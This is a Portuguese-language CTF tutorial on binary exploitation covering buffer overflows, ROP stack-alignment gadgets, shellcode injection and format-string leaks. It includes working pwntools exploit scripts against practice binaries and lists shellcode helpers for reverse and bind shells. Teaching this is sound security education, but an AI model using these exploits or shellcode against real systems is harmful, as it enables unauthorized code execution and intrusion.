# Sumário

- [Sumário](#sumário)
- [1. Introdução](#1-introdução)
  - [1.1 Roteiro de preparo para pwning](#11-roteiro-de-preparo-para-pwning)
- [2. Buffer Overflow](#2-buffer-overflow)
  - [2.1 Introdução ao Buffer Overflow](#21-introdução-ao-buffer-overflow)
  - [2.2 Buffer Overflow - Variáveis](#22-buffer-overflow---variáveis)
    - [2.2.1 csaw18\_boi](#221-csaw18_boi)
  - [2.3 Buffer Overflow - Call Function](#23-buffer-overflow---call-function)
    - [2.3.1 Cuidado ao sobrescrever Return Address: Desalinhamento de Stack](#231-cuidado-ao-sobrescrever-return-address-desalinhamento-de-stack)
      - [1° - Evitando PUSH RBP](#1---evitando-push-rbp)
      - [2° - ROP com ret](#2---rop-com-ret)
        - [Buscando gadget](#buscando-gadget)
        - [Por que `ret`?](#por-que-ret)
        - [Código em pwntools](#código-em-pwntools)
  - [2.4 Buffer Overflow - Shellcode](#24-buffer-overflow---shellcode)
    - [2.4.1 Inimigos do Shellcode: PIE e DEP](#241-inimigos-do-shellcode-pie-e-dep)
    - [2.4.2 Usando BOF Shellcode](#242-usando-bof-shellcode)
    - [2.4.4 ShellCode + pwntools](#244-shellcode--pwntools)
  - [3 Format Strings](#3-format-strings)
  - [3.1 aplicando Format Strings](#31-aplicando-format-strings)

# 1. Introdução

Antes de ler esse material, é importante você já ter visto o material introdutório a Rev, onde abordamos sobre como entender e utilizar assembly, debuggers e decompillers como Ghidra. Aqui, vamos aprender as vulnerabilidades e praticar em binários.

## 1.1 Roteiro de preparo para pwning

Este roteiro ajuda a entender como lidar com o binário inicialmente:

1. `strings file` - Acha todas as strings no binário. Assim, você tem uma ideia do que está codado bruto.
2. `pwn checksec` - Verifica proteções ativadas do binário (aprenderemos elas mais para frente)
3. `(gdb) info functions` - Verifica funções eistentes no arquivo
4. Abrir no decompilador, para entender o código do binário
5. Explorar vulnerabilidades com `pwntools` e `gdb`

# 2. Buffer Overflow

## 2.1 Introdução ao Buffer Overflow

Buffer Overflow é a arte de **usar inputs para sobrescrever memória**. Todos os programas, em geral, esperam uma entrada para produzir uma resposta, certo?

Por exemplo:

```C
int main(){
    char nome[5];

    scanf("%s", nome);
    printf("Você digitou: %s", nome);
}
```
Acima, temos um array de caracteres que suporta 5 elementos: 4 caracteres e um `\0` (na memória, é apenas um 00) no final, que indica que é o fim da string.

Simples, não? O programa irá funcionar com o seu input:

```
< John
> Você digitou: John
```

Vamos dar um `disass main` no pwdgb:

```
0x0000555555555149 <+0>:     push   rbp
   0x000055555555514a <+1>:     mov    rbp,rsp
=> 0x000055555555514d <+4>:     sub    rsp,0x10
   0x0000555555555151 <+8>:     lea    rax,[rbp-0x5]
   0x0000555555555155 <+12>:    mov    rsi,rax
   ...
```

Esse é o início da função `main`. Note que é subtraído `0x10` do `rsp`, o que quer dizer que a stack terá 16 bytes (0x10 = 16) para variáveis.

Depois, a instrução `lea` carrega o endereço de `rbp-0x5` no `rax`. O `rax` é só uma variável temporária, que passa o seu valor para `rsi`, que por sua vez é o registrador utilizado como primeiro parâmetro de uma função. Isso tudo é o preparo para chamar a função `scanf`, que usa o endereço guardado no `rsi` para atribuir o input do usuário.

Opa! Nossa variável não tinha tamanho 5? Vemos um `rbp-0x5` aqui. Exatamente, as coisas são bem intuitivas. Acabamos de ver memória ser alocada na stack para receber uma string com 4 caracteres + byte nulo.

Se analisarmos no pwndbg, após darmos o input `John` temos na stack:

```
─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdd40 ◂— 0
01:0008│-008 0x7fffffffdd48 ◂— 0x6e686f4affdde0
02:0010│ rbp 0x7fffffffdd50 ◂— 1
03:0018│+008 0x7fffffffdd58 —▸ 0x7ffff7ddfca8 (__libc_start_call_main+120) ◂— mov edi, eax
04:0020│+010 0x7fffffffdd60 —▸ 0x7fffffffde50 —▸ 0x7fffffffde58 ◂— 0x38 /* '8' */
05:0028│+018 0x7fffffffdd68 —▸ 0x555555555149 (main) ◂— push rbp
06:0030│+020 0x7fffffffdd70 ◂— 0x155554040
07:0038│+028 0x7fffffffdd78 —▸ 0x7fffffffde68 —▸ 0x7fffffffe148 ◂— '/mnt/c/Users/Ariel/Desktop/Manual-de-Engenharia-Reversa-Ganesh/test'
```

Vemos que só há um valor na stack entre o `rbp` e `rsp`. Se analisarmos esse valor:

```
0x6e686f4affdde0 = 
  6e 68 6f 4a ff dd e0
  n  h  o  J  [lixo de memória]
```

Na memória está sequencial, como veremos já já. Porém o GDB transforma isso em little endian (byte menos significativo primeiro), ou seja, inverte os bytes e mostra em um único hexadecimal.

O lixo de memória aparece justamente porque porque o GDB está mostrando o conteúdo bruto da memória no endereço que você examinou, não interpretando como string. Na verdade, ele está analisando 8 bytes de memória, que é o padrão. Porém, nossa variável ocupa apenas 5 bytes. Então sobram 3 bytes mesmo.

E dando `hexdump $rsp` para ver o binário da região da stack a partir do `rsp`, temos:

```
+0000 0x7fffffffdd40  00 00 00 00 00 00 00 00  e0 dd ff 4a 6f 68 6e 00  │........│...John.│
+0010 0x7fffffffdd50  01 00 00 00 00 00 00 00  a8 fc dd f7 ff 7f 00 00  │........│........│
+0020 0x7fffffffdd60  50 de ff ff ff 7f 00 00  49 51 55 55 55 55 00 00  │P.......│IQUUUU..│
+0030 0x7fffffffdd70  40 40 55 55 01 00 00 00  68 de ff ff ff 7f 00 00  │@@UU....│h.......│
```

Na memória, as coisas estão alinhadas. Note que temos 4a 6f 68 6e 00. O último caractere é o null terminator (indica fim da string).

Agora, vem uma questão. A variável suporta apenas 4 caracteres. O que ocorre se digitarmos 5?

```
< James
> Você digitou: James
```

Dando `hexdump $rsp`, temos:

```
 hexdump $rsp
+0000 0x7fffffffdd40  00 00 00 00 00 00 00 00  e0 dd ff 4a 61 6d 65 73  │........│...James│
+0010 0x7fffffffdd50  00 00 00 00 00 00 00 00  a8 fc dd f7 ff 7f 00 00  │........│........│
+0020 0x7fffffffdd60  50 de ff ff ff 7f 00 00  49 51 55 55 55 55 00 00  │P.......│IQUUUU..│
+0030 0x7fffffffdd70  40 40 55 55 01 00 00 00  68 de ff ff ff 7f 00 00  │@@UU....│h.......│
```

Veja, o `scanf` sobrescreveu a memória sem problemas. Mas agora o `\0` não está mais lá. Por sorte, os próximos bytes são `00`. Portanto, **o printf vai continuar lendo a string, mesmo que ela tenha passado o limite máximo, pois ele depende de encontrar o \0 ou 00 para terminar**. Isso é uma falha de segurança, pois permite vazar endereços de memória em um programa ao qual não temos acesso ao binário (cenas dos próximos capítulos).

E se decidirmos colocar uma string gigante?

```
< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
> Você digitou: James
```

Olhe só nossa stack agora:

```
─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdd40 ◂— 0
01:0008│-008 0x7fffffffdd48 ◂— 0x4141414141ffdde0
02:0010│ rbp 0x7fffffffdd50 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
... ↓        5 skipped
```

Perceba que o endereço de `rbp` foi sobrescrito com um monte de A's. E se dermos um `hexdump $rsp`:

```
hexdump $rsp

+0000 0x7fffffffdd40  00 00 00 00 00 00 00 00  e0 dd ff 41 41 41 41 41  │........│...AAAAA│
+0010 0x7fffffffdd50  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  │AAAAAAAA│AAAAAAAA│
... ↓            skipped 1 identical lines (16 bytes)
+0030 0x7fffffffdd70  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  │AAAAAAAA│AAAAAAAA│
```

Basicamente, acabamos de sobrescrever `0x7fffffffdd80 - 0x7fffffffdd4b = 0x35 = 53 (decimal)` Bytes (`0x7fffffffdd80` é o endereço do último byte com A. `0x7fffffffdd4b` é a quantidade de elementos que não são `41`)! E olha só, digitamos A 53 vezes.

Okay, isso significa que podemos **alterar o que quisermos na stack, desde a variável que permite o buffer overflow até depois do `rbp`**.

E o que acontece se tentarmos continuar o programa? Bom, não há outras variáveis no programa, então nada foi sobrescrito. Mas `rbp` e o `return address` (`rbp+0x8` em `x64`) foram sobrescritos. Quando a função `main` terminar, ela vai tentar voltar a algum endereço que estava guardado no `return address`, mas que se perdeu, pois sobrescrevemos ele com `0x4141414141414141`. Porém, ainda assim, esse endereço vai tentar ser acessado. No fim do código em assembly, vemos:

```
──────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────
   0x55555555517a <main+49>    mov    rdi, rax               RDI => 0x555555556007 ◂— 0x696420aac3636f56
   0x55555555517d <main+52>    mov    eax, 0                 EAX => 0
   0x555555555182 <main+57>    call   printf@plt                  <printf@plt>

   0x555555555187 <main+62>    mov    eax, 0                 EAX => 0
   0x55555555518c <main+67>    leave
 ► 0x55555555518d <main+68>    ret                                <0x4141414141414141>
```

Viu que a instrução `ret` tem o endereço `0x4141414141414141`? Se prosseguirmos com a execução do programa....

```
pwndbg> c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
```

**Segmentation fault**! Por que? Pois o endereço de memória `0x4141414141414141`, não deveria estar sendo acessado pelo programa, ou seja, é uma área de memória reservada de outro programa ou do sistema operacional.

O ponto principal do Buffer Overflow é que, **para um dado input, precisamos que o código leia mais caracteres do que a variável pode aguentar**. Se no código há um limite de caracteres, isso faz com que Buffer Overflow **não seja uma técnica possível**, e precisamos explorar outras possibiilidades.

## 2.2 Buffer Overflow - Variáveis

Como vimos, podemos sobrescrever variáveis com buffer overflow. Mas como podemos fazer isso?

1. Verifique informações do arquivo com `file arquivo`
2. Abra o programa no Ghidra ou Debugger
3. Verifique se a variável que queremos sobrescrever está **entre a variável do input e o `rbp` na stack**
4. Se estiver, podemos sobrescrever. **Calcule a distância para chegar no início da variável desejada, e sobrescreva com caracteres quaisquer**.
   1. Basicamente, teremos nosso input como `rbp-0x10`, por exemplo, e a outra variável em `rbp-0x5`. Isso quer dizer que a distância entre eles é `0x10 - 0x5 = 0xb = 11`. Ou seja, para chegarmos no **início** de `rbp-0x5`, precisamos sobrescrever a stack com 11 bytes quaisquer.
   2. Geralmente, usamos caracteres, pois cada caractere = 1 byte e fica fácil de contabilizar.
5. Ao final da string, **coloque o que você deseja que seja sobrescrito na variável**.

**Atenção**: Você precisa respeitar a quantidade de espaço de cada variável. Se a variável possui 4 bytes e você sobrescrever apenas 3, um byte será lixo de memória, e vai interferir no valor da variável.

**Curiosidade**: Às vezes você não possui um excedente necessário para fazer Buffer Overflow. Mas, em alguns casos, você pode usar BOF para **modificar a format string** que define o limite de leitura do input. Isso só é possível se a format string estiver na stack (na maioria dos casos ela está em uma região de dados separada, onde há apenas dados constantes, que não são variáveis).

Abaixo, temos alguns binários que ficam para você como lição de casa. Tente resolvê-los e veja o solve caso tenha dificuldade. Os arquivos estão [aqui](./bins_and_solves/04-bof_variable/).

### 2.2.1 csaw18_boi

Antes, vamos ver algumas informações sobre o arquivo:

```
$ file boi

boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
```

Veja que temos um arquivo em `x86`. Isso quer dizer que

Vejamos a main de um programa abaixo:

```
0x0000000000400641 <+0>:     push   rbp
   0x0000000000400642 <+1>:     mov    rbp,rsp
   0x0000000000400645 <+4>:     sub    rsp,0x40
   0x0000000000400649 <+8>:     mov    DWORD PTR [rbp-0x34],edi
   0x000000000040064c <+11>:    mov    QWORD PTR [rbp-0x40],rsi
   0x0000000000400650 <+15>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000400659 <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000040065d <+28>:    xor    eax,eax
   0x000000000040065f <+30>:    mov    QWORD PTR [rbp-0x30],0x0
   0x0000000000400667 <+38>:    mov    QWORD PTR [rbp-0x28],0x0
   0x000000000040066f <+46>:    mov    QWORD PTR [rbp-0x20],0x0
   0x0000000000400677 <+54>:    mov    DWORD PTR [rbp-0x18],0x0
   0x000000000040067e <+61>:    mov    DWORD PTR [rbp-0x1c],0xdeadbeef
   0x0000000000400685 <+68>:    mov    edi,0x400764
   0x000000000040068a <+73>:    call   0x4004d0 <puts@plt>
   0x000000000040068f <+78>:    lea    rax,[rbp-0x30]
   0x0000000000400693 <+82>:    mov    edx,0x18
   0x0000000000400698 <+87>:    mov    rsi,rax
   0x000000000040069b <+90>:    mov    edi,0x0
   0x00000000004006a0 <+95>:    call   0x400500 <read@plt>
   0x00000000004006a5 <+100>:   mov    eax,DWORD PTR [rbp-0x1c]
   0x00000000004006a8 <+103>:   cmp    eax,0xcaf3baee
   0x00000000004006ad <+108>:   jne    0x4006bb <main+122>
   0x00000000004006af <+110>:   mov    edi,0x40077c
   0x00000000004006b4 <+115>:   call   0x400626 <run_cmd>
   0x00000000004006b9 <+120>:   jmp    0x4006c5 <main+132>
   0x00000000004006bb <+122>:   mov    edi,0x400786
   0x00000000004006c0 <+127>:   call   0x400626 <run_cmd>
   0x00000000004006c5 <+132>:   mov    eax,0x0
   0x00000000004006ca <+137>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000004006ce <+141>:   xor    rcx,QWORD PTR fs:0x28
   0x00000000004006d7 <+150>:   je     0x4006de <main+157>
   0x00000000004006d9 <+152>:   call   0x4004e0 <__stack_chk_fail@plt>
   0x00000000004006de <+157>:   leave
   0x00000000004006df <+158>:   ret
```

Podemos ver que o programa verifica se a variável `rbp-0x1c` é igual a `0xcaf3baee` (sim, é um número inteiro expresso em hexadecimal), ou seja, um IF:

```
   0x00000000004006a5 <+100>:   mov    eax,DWORD PTR [rbp-0x1c]
   0x00000000004006a8 <+103>:   cmp    eax,0xcaf3baee
```

Se esta condição for verdadeira, isso irá abrir uma shell, ou seja, o `run_cmd` nos permite executar comandos (se tivermos acesso a isso, obtemos acesso completo ao servidor onde o arquivo roda).

Se verificarmos, a variável `rbp-0x1c` é inicializada antes com `0xdeadbeef`:

```
   0x000000000040067e <+61>:    mov    DWORD PTR [rbp-0x1c],0xdeadbeef
```

Porém, o problema é que a variável passada para o `read`, que lê o input e atribui a uma variável, é outra completamente diferente:

```
   0x000000000040068f <+78>:    lea    rax,[rbp-0x30]
   0x0000000000400693 <+82>:    mov    edx,0x18
   0x0000000000400698 <+87>:    mov    rsi,rax
   0x000000000040069b <+90>:    mov    edi,0x0
   0x00000000004006a0 <+95>:    call   0x400500 <read@plt>
```

Vemos que a variável passada como parâmetro é `rbp-0x30` (os registradores `rsi`, `rdi` são usados para passar argumentos para funções). Ou seja, esse é o input no qual colocamos uma string.

A função `read` não possui limite de leitura, então podemos fazer um Buffer Overflow.

Temos o input `rbp-0x30` e a variável que queremos sobrescrever em `rbp-0x1c`. Como `0x1c < 0x30`, a variável desejada está entre nosso input e o `rbp`, portanto podemos sobrescrever.

A distância entre o input e a variável é `0x30-0x1c = 0x14 = 20`. Portanto, precisamos encher 20 casas com caracteres e depois colocar o que queremos. Vamos fazer isso com pwntools, em python: 

```py
# Importa pwntools
from pwn import *

# Estabelece o processo alvo
target = process('./boi')

# Faz o payload
# 0x14 bytes de dados quaisquer para encher o espaço entre
# o início de nosso input e o início da variável alvo (inteiro)
# 0x4 byte int we will overwrite target with
payload = b"0"*0x14 + p32(0xcaf3baee)

# Send the payload
target.send(payload)

# Drop to an interactive shell so we can interact with our shell
target.interactive()
```

Um ponto importante é que, como o arquivo está em `x86`, precisamos empacotar o valor `0xcaf3baee` para ocupar 4 bytes, além de deixar em little endian. A função `p32()` faz isto para nós.

Quando rodamos o script...

```
$ python3 exploit.py
[+] Starting local process './boi': pid 4700
[*] Switching to interactive mode
Are you a big boiiiii??
$ hey
/bin/bash: line 1: hey: command not found
$ ls
boi  exploit.py  input  Readme.md
```

Sobrescrever a variável validou a condição que estava sendo verificada. Isto abriu para nós uma shell! (podemos digitar comandos e navegar pelo servidor onde o arquivo está sendo executado)

Chall completo :)

## 2.3 Buffer Overflow - Call Function

Na stack, vimos que há um endereço de retorno. Em `x64`, esse endereço de retorno fica em `rbp+0x8`. Em `x32`, esse endereço de retorno fica em `ebp+0x4`.

Sempre que uma função chega ao final, ela chama a instrução `ret`, que desempilha esse endereço de retorno, extrai o endereço que está ali guardado, e atribui ao `rip`, de modo que o programa começa a ler instruções a partir daquele endereço.

Podemos utilizar Buffer Overflow para **sobrescrever esse endereço de retorno e ir para o lugar que quisermos no código**. Sim, podemos chamar qualquer função, mesmo que ela nunca seja chamada no código (ela só precisa existir).

Para fazer um Buffer Overflow Call Function:

1. Verifique informações do arquivo com `file arquivo`
2. Abra o programa no Ghidra ou Debugger
3. **Calcule a distância entre o início do input e do endereço de retorno** `rbp+0x8` (x64) ou `ebp+0x4` (x32)
   1. Ex: Se a variável está em `rbp-0x10`, a distância é `0x10 + 0x8 = 0x18`.
4. Em uma string, coloque caracteres para preencher essa distância. Ao final, **adicione o endereço de algum lugar do programa**.

Para obter endereços, é recomendável **usar o Ghidra para explorar outras funções que podem existir no arquivo**. Mas há um porém. Existe uma segurança implementada por padrão que é a **randomização de memória**. Toda vez que um programa roda, essa segurança pega endereços aleatórios de memória RAM. Assim, mesmo que você tente um endereço que viu no Ghidra, não irá funcionar, pois outro endereço é que está ativo.

Para vencer esse obstáculo, você teria que vazar um endereço de memória, como vimos que pode ser feito tirando o \0 do fim da string. Mas isso é muito mais limitado do que navegar pelo Ghidra e achar a função com o endereço certinho.

Nesses desafios, essa proteção está desativada, e você pode apenas copiar e colar os endereços. Mais adiante abordaremos sobre isso.

### 2.3.1 Cuidado ao sobrescrever Return Address: Desalinhamento de Stack

Existem algumas funções importantes que utilizam instruções que exigem que a Stack esteja alinhada, como, por exemplo, a função `system("./bin/sh")`. Se seu objetivo for chamar uma função que tenha essa função dentro, o programa vai resultar em falha de segmentação.

Para `x64`, a stack deve ter o tamanho sempre de um múltiplo de `16 bytes` antes de uma chamada de função `call`. Para `x86`, não há requisito rígido pré-chamada.

Em particular, instruções SSE exigem `[rsp] % 16 == 0`

```
; Instrução SSE
movaps xmm0, [rsp]    ; ⚠️ CRASH se [rsp] não for múltiplo de 16
```

Vamos verificar alinhamento de stack para `x64`, onde realmente isso pode causar problemas.

Se não estivéssemos fazendo o BOF para chamar uma função, o programa seguiria um padrão de instruções: 

- `call funcao` - `PUSH RIP` (`RSP = RSP - 8`) e `JMP 0xfuncaoaddr` (+8 bytes na stack) // **Desalinha** (8 bytes)
- `inicio_funcao` - `PUSH RBP` (`RSP = RSP - 8`) (+8 bytes na stack) // **Alinha** (16 bytes)

Isso resulta em uma stack alinhada.

Mas como estamos sobrescrevendo o Return Address para irmos ao lugar que quisermos, não existe call, e sim uma modificação do que se faz após `leave` e `ret` na função original (`main`). Segue o fluxo:

- `leave` - `MOV RSP, RBP`; `POP RBP` (`RSP = RSP + 8`) (-8 bytes na stack) // **Desalinha** (-8 bytes)
- `ret` - `POP RIP` (`RSP = RSP + 8`) (-8 bytes na stack) // **Alinha** (-16 bytes)
- `inicio_funcao` - `PUSH RBP` (`RSP = RSP - 8`) (+8 bytes na stack) // **Desalinha** (-8 bytes)

Isso vai resultar em **SEGSV (Segmentation Fault)**, e o programa vai crashar.

**Como evitar desalinhamento de stack**? Há duas maneiras.

#### 1° - Evitando PUSH RBP

Suponha que a função para a qual queremos pular está em `0x00000001`. A instrução PUSH RBP ocupa 1 byte de memória. Portanto, para pular para a próxima, basta usar o endereço `0x00000002`.

```py
target_address = 0x401234 + 1  # Pula o push rbp
```

Ou você pode verificar o endereço da próxima instrução ao PUSH RBP no decompilador ou gdb.

#### 2° - ROP com ret

Essa técnica é mais confiável e robusta. **ROP (Return Oriented Programming) é uma técnica de exploração que usa pedaços de códigos já existentes no programa (gadgets) para executar código malicioso**.

Basicamente, vamos **achar o endereço na memória de uma instrução** `ret`, um **gadget**. Isso só é possível **se a proteção PIE não estiver ativada** (randomização de memória),

##### Buscando gadget

Podemos usar o comando Linux (deve ser instalado) `ROPgadget`: `ROPgadget -- binary meu_programa | grep "ret"`.

Também podemos usar **pwntools**: 

```py
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# Encontra gadgets ret
ret_gadgets = rop.find_gadget(['ret'])
print(f"Ret gadget: {hex(ret_gadgets.address)}") # Imprime endereço do gadget
```

Assim, podemos montar nosso payload.

Mas, antes de usarmos esse `ret`, vamos entender por que ele funciona.

##### Por que `ret`?

No **fim de uma função qualquer**, sempre teremos as instruções:
```
0x0000000000401208 <+124>:   leave
0x0000000000401209 <+125>:   ret
```

- `leave` - Comando compacto:
  - `MOV RSP, RBP` - `RBP` é copiado para `RSP`. Isso destrói o stack frame da função, descartando todas as variáveis locais. (agora, o próximo da stack é o `RBP` antigo)
  - `POP RBP` - O valor no topo da pilha (`RBP` antigo) é desempilhado para o registrador `RBP`. Isso faz o stack frame "voltar para trás". (agora, o próximo da stack é o `return address`)
- `ret` - Comando compacto:
  - `POP RIP` - O valor no topo da pilha (apontado pelo `RSP`) agora é `RBP+8`, o `return address` que tentamos sobrescrever. Como `RIP` é o registrador que indica a instrução atual ativa, estamos fazendo o programa "pular" para um endereço de memória salvo em `RBP+8`.

Esse é o fluxo normal de sair de uma função e ir para outra. Isso deixa a stack alinhada. O efeito que o `ret` tem é de **tirar 8 bytes da stack**.

```
No assembly:

[RBP-0x20] = AAAA...          (bytes de padding)
[RBP+0x00] = RBP antigo        (8 bytes) <- RSP = RBP
[RBP+0x08] = RET gadget        ← RIP vai aqui
...
No RIP:
0x00000000ff ret -> Efeito: POP RIP (tira 8 bytes da stack)
```

Se sobrescrevemos o `return address` com um endereço de um local do código com `ret`, teremos o seguinte fluxo:
- `leave` - Comando compacto:
  - `MOV RSP, RBP` - `RBP` é copiado para `RSP`. Isso destrói o stack frame da função, descartando todas as variáveis locais. (agora, o próximo da stack é o `RBP` antigo)
  - `POP RBP` - O valor no topo da pilha (`RBP` antigo) é desempilhado para o registrador `RBP`. Isso faz o stack frame "voltar para trás". (agora, o próximo da stack é o `return address`)
- `ret` - Comando compacto:
  - `POP RIP` - O valor no topo da pilha (apontado pelo `RSP`) agora é `RBP+0x8`, o `return address` que contém o ROP. Pulamos para um endereço de memória salvo em `RBP+8`.
- Somos levados a uma instrução `ret` novamente, que interage com a stack.
- `ret` - Comando compacto:
  - `POP RIP` - O valor no topo da pilha (apontado pelo `RSP`) agora é `RBP+0x10`, o `return address` que tentamos sobrescrever. Pulamos para um endereço de memória salvo em `RBP+0x10`, que é nossa função.

Assim, teremos a seguinte stack após um overflow:
```
[RBP-0x20] = AAAA...          (bytes de padding)
[RBP+0x00] = RBP antigo        (8 bytes) 
[RBP+0x08] = RET gadget        ← RIP vai aqui primeiro!
[RBP+0x10] = Função alvo       ← RIP vai aqui depois!
```

E:

- `leave` - `MOV RSP, RBP`; `POP RBP` (`RSP = RSP + 8`) (-8 bytes na stack) // **Desalinha** (-8 bytes)
- `ret` - `POP RIP` (`RSP = RSP + 8`) (-8 bytes na stack) // **Alinha** (-16 bytes)
- Agora, o `ret` leva a um lugar que não era para levar (manipulado por nós)
- `ret` - `POP RIP` (`RSP = RSP + 16`) (-8 bytes na stack) // **Alinha** (-24 bytes)
- `inicio_funcao` - `PUSH RBP` (`RSP = RSP - 8`) (+8 bytes na stack) // **Desalinha** (-16 bytes)

Veja, alinhamos com 16 bytes agora.

##### Código em pwntools

```py

# Acha gadget
elf = ELF('./vuln')
rop = ROP(elf)
ret = rop.find_gadget(['ret'])

# Alinha com ret e entra na função
payload = b'A' * 40
payload += p64(ret)
payload += p64(func_addr)
```

## 2.4 Buffer Overflow - Shellcode

Shell Code é um **pequeno trecho de código em Assembly usado como payload (carga útil) em um ataque**. O código é muito pequeno por ser em assembly, portanto apenas poucos bytes são necessários, dependendo do shellcode.

Com shellcode, **fazemos o programa rodar funcionalidades que o programador não escreveu**. Normalmente, shellcode é utilizado para fazer uma chamada de API do Windows ou Syscall no Linux.

No C, estaríamos fazendo algo como:

```C
int main() {
    system("/bin/sh"); // Chama shell
    return 0;
}
```

O Shellcode é a versão compacta disso, em assembly, que pode ser injetada na memória através de um input. Ou seja, **Shellcode é código Assembly normal**, nada especial.

A razão pela qual Shellcode possui sucesso é por que **o computador não diferencia dados e instruções**. Não importa onde ou como você fala para rodar, o computador VAI tentar rodar. Assim, mesmo que nosso input seja apenas dados, o computador não sabe disso.

### 2.4.1 Inimigos do Shellcode: PIE e DEP

PIE (Position-Independent Executables) é uma técnica de segurança que randomiza a memória do programa. Para realizar shellcode, precisamos saber exatamente o que vamos fazer. O PIE pode ser burlado se você conseguir vazar os endereços de memória que precisa, mas isso não vem ao caso agora.

A outra proteção é o DEP (Data Execution Prevention). Esse é mais mortal, pois impede que áreas da memória que deveriam conter apenas dados (stack, heap) sejam executadas como código. O que contorna isso são os ataques de ROP. Ou seja, nada de injetar código novo, só podemos reaproveitar o que já existe no código.

### 2.4.2 Usando BOF Shellcode

Basicamente:

1. Identifique se é possível fazer BOF
2. Coloque o **Shellcode no Input** + **Padding até `return address`** + **Endereço do início do Shellcode na stack**
3. Sim, acabamos de mandar o `RIP` executar instrução na stack.

Exemplo com pwntools, abrindo uma shell (`shellcraft.sh()`):

```py
from pwn import *

context.binary = ELF('./program')

p = process()

payload = asm(shellcraft.sh())          # Shellcode
payload = payload.ljust(312, b'A')      # Padding
payload += p32(0xffffcfb4)              # Endereço do Shellcode

log.info(p.clean())

p.sendline(payload)

p.interactive()
```


### 2.4.4 ShellCode + pwntools

```py
# Shellcodes prontos populares
shellcraft.sh()           # /bin/sh
shellcraft.cat('file')    # cat file
shellcraft.dupsh()        # Duplica shell para fd
shellcraft.echo('text')   # Imprime texto
shellcraft.exit()         # Sai do processo
shellcraft.findpeersh()   # Encontra peer shell

# Redes
shellcraft.connect('ip', port)
shellcraft.bindsh(port)
shellcraft.reverse('ip', port)

# Sistema de arquivos
shellcraft.getdents(fd)
shellcraft.getcwd()
```

Exemplo: 

```py
#!/usr/bin/env python3
from pwn import *

# Configurar
context.binary = ELF('./program')

p = process()

print("Gerando shellcode /bin/sh...")

# Gerar shellcode
shellcode = asm(shellcraft.sh())

print(f"Shellcode: {len(shellcode)} bytes")
print(hexdump(shellcode))

# Disassemblar para ver as instruções
print("\\nInstruções Assembly:")
print(disasm(shellcode))

# Testar (opcional - descomente para executar)
# print("\\n🚀 Executando shellcode...")
# p = run_shellcode(shellcode)
# p.interactive()
```

## 3 Format Strings

Em C, a função printf recebe Format Specifiers e coloca variáveis nos lugares deles para imprimir ao usuário.

```C
int value = 1205;

printf("%x %x %x", value, value, value);

// Saída: 4b5 4b5 4b5
```

Mas e se não tivermos argumentos o suficiente para todos os format specifiers?

```C
int value = 1205;

printf("%x %x %x", value);

// Saída: 4b5 5659b000 565981b0
```

O `printf` espera a mesma quantidade de parâmetros que Format Specifiers, e apenas puxa esses parâmetros da stack. Se não há parâmetros suficientes na stack, **a função vai pegar os próximos valores, vazando endereços da stack**.

## 3.1 aplicando Format Strings

Temos o seguinte programa:

```C
#include <stdio.h>

int main(void) {
    char buffer[30];
    
    gets(buffer);

    printf(buffer);
    return 0;
}
```

Input: `%x %x %x %x %x`
Output: `f7f74080 0 5657b1c0 782573fc 20782520`

```
────────────────[ STACK ]────────────────
00:0000│ esp 0xffffcf10 —▸ 0xffffcf28 ◂— '%x %x %x %x %x'
01:0004│-0e4 0xffffcf14 —▸ 0xf7d843ac ◂— 0x74656e00
02:0008│-0e0 0xffffcf18 —▸ 0x8048288 ◂— '__libc_start_main'
03:000c│-0dc 0xffffcf1c —▸ 0x804918c (main+26) ◂— add ebx, 0x2e74
04:0010│-0d8 0xffffcf20 ◂— 0x7b1ea71
05:0014│-0d4 0xffffcf24 ◂— 0
06:0018│-0d0 0xffffcf28 ◂— '%x %x %x %x %x'
07:001c│-0cc 0xffffcf2c ◂— 'x %x %x %x'
```

Veja que o que foi vazado foi o **primeiro endereço a partir de esp em diante**: `esp+0x4`, `esp+0x8`,...

Regra do printf:

- printf espera parâmetros após o formato na pilha
- O primeiro parâmetro (string de formato) está no topo da pilha no momento da chamada
- Os parâmetros seguintes (que deveriam ser os valores para %x) estariam imediatamente após

Para chamar `printf(buffer)`, o compilador precisa:

1. Empurrar os parâmetros na pilha
2. Chamar a função

Para `printf("%d %d", a, b)`:

```
; Supondo que buffer esteja em [ebp-30]
push b  (34)        ← terceiro parâmetro
push a  (99)        ← segundo parâmetro  
lea eax, [ebp-30]    ; eax = endereço do buffer (que contém "%x %x %x %x %x")
push eax         ← primeiro parâmetro
call printf          ; push endereço de retorno, jump para printf
```

Após push eax, temos apenas:

```
(endereços altos)
+------------------+
| ...              |
| end. retorno main|
+------------------+
| ebp salvo        | ← EBP
+------------------+
| buffer[29]       | \
| ...              |  | buffer (variável local)
| buffer[0]="%x"   | /
+------------------+ 
| a                | ← ESP+12 (onde 2º %d vai buscar)
+------------------+ 
| b                | ← ESP+8 (onde 1º %d vai buscar)
+------------------+
| 1 Parâmetro      | ← ESP+4
+------------------+
| ponteiro p/ buffer| ← ESP APONTA AQUI! (primeiro parâmetro do printf)
+------------------+
(endereços baixos)
```

Após dar push eax e call printf, teremos, de maneira geral:

```
(endereços altos)
+------------------+ 
| ...              | ↑
+------------------+ 
| end. retorno main| 
+------------------+ 
| ebp salvo        | ← EBP da main (antes do printf)
+------------------+ 
| buffer[29]       | \
| ...              |  | buffer ← região local da main
| buffer[0]="%x"   | /
+------------------+
| ???              | ← EBP+20 (onde 3º %x vai buscar)
+------------------+
| ???              | ← EBP+16 (onde 2º %x vai buscar)
+------------------+
